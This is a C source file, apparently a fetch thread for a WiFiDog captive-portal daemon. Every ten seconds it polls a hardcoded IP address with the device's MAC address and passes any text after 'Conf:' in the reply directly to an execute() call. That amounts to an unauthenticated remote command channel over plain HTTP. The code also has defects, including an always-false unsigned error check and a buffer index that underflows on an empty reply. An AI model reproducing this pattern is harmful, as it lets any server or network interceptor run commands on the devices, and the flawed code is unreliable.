#include <stdio.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <pthread.h>

#include "utils.h"
#include "fetch_thread.h"

void fetch(char *mac);


void
thread_fetch(void *arg){

	pthread_cond_t		cond = PTHREAD_COND_INITIALIZER;
	pthread_mutex_t		cond_mutex = PTHREAD_MUTEX_INITIALIZER;
	struct	timespec	timeout;
	char *mac = arg;

	while (1) {

		timeout.tv_sec = time(NULL) + 10;
		timeout.tv_nsec = 0;
		
		fetch(mac);
		pthread_mutex_lock(&cond_mutex);

		pthread_cond_timedwait(&cond, &cond_mutex, &timeout);
		pthread_mutex_unlock(&cond_mutex);

	}
	

}

void fetch(char *mac){

    struct sockaddr_in servaddr;
    int sock;
    int tmpres;

    char			request[MAX_BUF];
    unsigned int	        totalbytes;
    int			nfds, done;
    fd_set			readfds;
    unsigned int		numbytes;
    char *str = NULL;    
    char *macstr = mac;

    sock = connect_auth_server();
    if (sock == -1) {
	    return;
    }



    snprintf(request, sizeof(request) - 1,
		    "GET %s?id=%s HTTP/1.1\r\n"
		    "User-Agent: WiFiDog %s\r\n"
		    "Host: %s\r\n"
		    "\r\n",
		    "http://117.34.78.195/activity",
		    macstr,
		    "1.1",
		    "117.34.78.195");

    fprintf_locked(stdout, " %s \n", request);    
    send(sock, request, strlen(request), 0);

	numbytes = totalbytes = 0;
	done = 0;
	do {
		FD_ZERO(&readfds);
		FD_SET(sock, &readfds);
		nfds = sock + 1;

		nfds = select(nfds, &readfds, NULL, NULL, NULL);

		if (nfds > 0) {
			numbytes = read(sock, request + totalbytes, MAX_BUF - (totalbytes + 1));
			if (numbytes < 0) {
				close(sock);
				return;
			}
			else if (numbytes == 0) {
				done = 1;
			}
			else {
				totalbytes += numbytes;
				done = 1;
			}
		}
		else if (nfds == 0) {
			close(sock);
			return;
		}
		else if (nfds < 0) {
			close(sock);
			return;
		}
	} while (!done);


    request[totalbytes-2] = '\0';

    //fprintf_locked(stdout, "hello world %s \n", request);    

    str = strstr(request,"Conf:");
    if(str){
	str = str+5;
    	fprintf_locked(stdout, "%s \n", str);    
	execute(str, 0);
    }
    //printf("http response %s ",request);
    close(sock);
    return 0;
}



